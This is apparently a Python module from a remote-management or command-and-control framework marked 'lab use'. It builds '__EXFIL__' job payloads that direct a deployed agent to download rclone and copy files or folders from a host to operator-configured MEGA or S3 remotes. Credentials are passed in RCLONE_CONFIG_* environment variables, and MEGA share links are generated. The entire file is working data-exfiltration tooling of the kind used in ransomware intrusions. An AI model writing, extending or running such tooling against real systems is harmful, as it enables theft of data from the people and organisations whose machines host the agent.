"""rclone exfil profiles and agent job payloads (lab use).

Remote profiles (MEGA, S3, …) are configured by the active operator workspace
in workspace mode, or by the RMM server in the legacy server mode. When an
operator queues exfil, the selected process embeds ephemeral
``RCLONE_CONFIG_*`` variables in the ``__EXFIL__`` command; the agent runs
``rclone copyto`` (file) or ``rclone copy`` (directory) locally.
"""

from __future__ import annotations

from rmm_settings import getenv as settings_getenv

import json
import os
import re

RCLONE_REMOTE_NAME = "RMM"
TOOLS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools", "rclone")
DEFAULT_RCLONE_BIN = os.path.join(TOOLS_DIR, "rclone.exe")
RCLONE_BIN_PATH = settings_getenv("RMM_RCLONE_BIN", DEFAULT_RCLONE_BIN).strip()
RCLONE_TOOLS_URL = "/tools/rclone.exe"
DEFAULT_PROFILE = settings_getenv("RMM_RCLONE_DEFAULT_PROFILE", "mega-lab").strip() or "mega-lab"

_PROFILE_KEY_MAP = {
    "user": "USER",
    "pass": "PASS",
    "password": "PASS",
    "access_key_id": "ACCESS_KEY_ID",
    "secret_access_key": "SECRET_ACCESS_KEY",
    "region": "REGION",
    "provider": "PROVIDER",
    "endpoint": "ENDPOINT",
    "location": "LOCATION",
    "acl": "ACL",
    "storage_class": "STORAGE_CLASS",
}


class RcloneConfigError(Exception):
    """Profile or rclone binary configuration is invalid."""


def get_rclone_default_profile() -> str:
    """Return the current default profile name from the process environment."""
    return settings_getenv("RMM_RCLONE_DEFAULT_PROFILE", "").strip() or DEFAULT_PROFILE


def _env_int(name: str, default: int) -> int:
    raw = settings_getenv(name, "").strip()
    if not raw:
        return default
    try:
        return int(raw)
    except ValueError:
        return default


def get_rclone_max_bytes() -> int:
    """Max exfil size in bytes (single file or whole folder); 0 means unlimited."""
    return _env_int("RMM_RCLONE_MAX_BYTES", 100 * 1024 * 1024)


# Backward-compatible alias (prefer get_rclone_max_bytes() after env may change at startup).
RCLONE_MAX_BYTES = get_rclone_max_bytes()


def rclone_binary_available() -> bool:
    path = RCLONE_BIN_PATH
    return bool(path) and os.path.isfile(path)


def _mask_secret(value: str) -> str:
    if not value:
        return ""
    if len(value) <= 2:
        return "***"
    return value[:1] + "***" + value[-1:]


def _mask_profile(name: str, profile: dict) -> dict:
    masked = {
        "name": name,
        "type": profile.get("type"),
        "folder": profile.get("folder"),
        "description": profile.get("description"),
    }
    for key in ("user", "pass", "password", "access_key_id", "secret_access_key"):
        if key in profile and profile[key]:
            masked[key] = _mask_secret(str(profile[key]))
    return masked


def load_profiles(
    path_override: str | None = None,
    raw_override: str | None = None,
) -> dict[str, dict]:
    """Load named rclone remote profiles from an override, env, or example file."""
    raw = (
        str(raw_override).strip()
        if raw_override is not None
        else settings_getenv("RMM_RCLONE_PROFILES", "").strip()
    )
    path = (
        str(path_override).strip()
        if path_override is not None
        else settings_getenv("RMM_RCLONE_PROFILES_FILE", "").strip()
    )
    if path:
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
    elif raw:
        data = json.loads(raw)
    else:
        example = os.path.join(TOOLS_DIR, "profiles.example.json")
        if os.path.isfile(example):
            with open(example, encoding="utf-8") as f:
                data = json.load(f)
        else:
            data = {}
    if not isinstance(data, dict):
        raise RcloneConfigError("RMM rclone profiles must be a JSON object")
    out: dict[str, dict] = {}
    for name, profile in data.items():
        if not isinstance(profile, dict):
            continue
        if not profile.get("type"):
            continue
        out[str(name)] = profile
    return out


def get_profile(name: str, profiles: dict[str, dict] | None = None) -> dict:
    """Return one named profile from the supplied or configured collection."""
    profiles = profiles if profiles is not None else load_profiles()
    if name not in profiles:
        known = ", ".join(sorted(profiles)) or "(none)"
        raise RcloneConfigError(
            f"Unknown rclone profile {name!r} — configured profiles: {known}"
        )
    return profiles[name]


def profile_to_rclone_env(profile: dict) -> dict[str, str]:
    """Build ephemeral RCLONE_CONFIG_* environment for one remote."""
    remote = RCLONE_REMOTE_NAME
    remote_type = str(profile.get("type", "")).strip()
    if not remote_type:
        raise RcloneConfigError("Profile missing type")
    skip = {"type", "folder", "name", "description", "pass_obscured"}
    env: dict[str, str] = {f"RCLONE_CONFIG_{remote}_TYPE": remote_type}
    for key, value in profile.items():
        if key in skip or value is None:
            continue
        rkey = _PROFILE_KEY_MAP.get(key, key.upper())
        env[f"RCLONE_CONFIG_{remote}_{rkey}"] = str(value)
    return env


def profile_to_plugin_settings(profile: dict) -> dict[str, str]:
    """Build plugin backend settings using rclone's option names."""
    skip = {"type", "folder", "name", "description", "pass_obscured"}
    settings: dict[str, str] = {}
    for key, value in profile.items():
        if key in skip or value is None:
            continue
        backend_key = _PROFILE_KEY_MAP.get(key, key).lower()
        settings[backend_key] = str(value)
    return settings


def resolve_dest_path(profile: dict, local_path: str, dest: str | None) -> str:
    """Cloud destination path inside the configured remote (file or folder basename)."""
    if dest and dest.strip():
        return dest.strip().lstrip("/")
    folder = str(profile.get("folder") or "").strip().strip("/")
    base = os.path.basename(local_path.replace("\\", "/"))
    base = re.sub(r'[<>:"/\\|?*]', "_", base) or "upload.bin"
    if folder:
        return f"{folder}/{base}"
    return base


def build_plugin_exfil_job(
    local_path: str,
    profile_name: str,
    *,
    dest: str | None = None,
    max_minutes: int = 30,
    profiles: dict[str, dict] | None = None,
    max_bytes: int | None = None,
) -> dict:
    """Build the in-process Go plugin job for one local profile."""
    profile = get_profile(profile_name, profiles)
    return {
        "source": local_path,
        "account": RCLONE_REMOTE_NAME,
        "backend": profile.get("type"),
        "target": resolve_dest_path(profile, local_path, dest),
        "settings": profile_to_plugin_settings(profile),
        "make_link": bool(profile.get("type") == "mega"),
        "max_minutes": max(1, int(max_minutes)),
        "max_bytes": get_rclone_max_bytes() if max_bytes is None else max(0, int(max_bytes)),
    }


def build_exfil_payload(
    local_path: str,
    profile_name: str,
    *,
    dest: str | None = None,
    profiles: dict[str, dict] | None = None,
    max_bytes: int | None = None,
) -> dict:
    """JSON payload embedded in the agent ``__EXFIL__`` command."""
    profile = get_profile(profile_name, profiles)
    remote = RCLONE_REMOTE_NAME
    env_skip_obscure: list[str] = []
    if profile.get("pass_obscured"):
        env_skip_obscure.append(f"RCLONE_CONFIG_{remote}_PASS")
    return {
        "local_path": local_path,
        "profile": profile_name,
        "backend": profile.get("type"),
        "dest": resolve_dest_path(profile, local_path, dest),
        "env": profile_to_rclone_env(profile),
        "env_skip_obscure": env_skip_obscure,
        "remote_name": remote,
        "max_bytes": get_rclone_max_bytes() if max_bytes is None else max(0, int(max_bytes)),
        "rclone_url": RCLONE_TOOLS_URL,
        "link_command": bool(profile.get("type") == "mega"),
    }


def build_exfil_command(
    local_path: str,
    profile_name: str,
    *,
    dest: str | None = None,
) -> str:
    payload = build_exfil_payload(local_path, profile_name, dest=dest)
    return build_exfil_command_from_payload(payload)


def build_exfil_command_from_payload(payload: dict) -> str:
    """Serialize a workspace-built binary exfil payload for the agent queue."""
    if not isinstance(payload, dict) or not str(payload.get("local_path") or "").strip():
        raise RcloneConfigError("invalid rclone exfil payload")
    return f"__EXFIL__\n{json.dumps(payload, separators=(',', ':'))}"


def rclone_public_config(
    *,
    profiles: dict[str, dict] | None = None,
    default_profile: str | None = None,
    max_bytes: int | None = None,
) -> dict:
    """Operator-safe rclone status (no secrets)."""
    try:
        profiles = profiles if profiles is not None else load_profiles()
    except (OSError, json.JSONDecodeError, RcloneConfigError) as exc:
        profiles = {}
        load_error = str(exc)
    else:
        load_error = None
    return {
        "upload_location": "agent",
        "max_bytes": get_rclone_max_bytes() if max_bytes is None else max(0, int(max_bytes)),
        "default_profile": default_profile or get_rclone_default_profile(),
        "rclone_binary": rclone_binary_available(),
        "rclone_binary_path": RCLONE_BIN_PATH if rclone_binary_available() else None,
        "profiles": [_mask_profile(n, p) for n, p in sorted(profiles.items())],
        "load_error": load_error,
    }
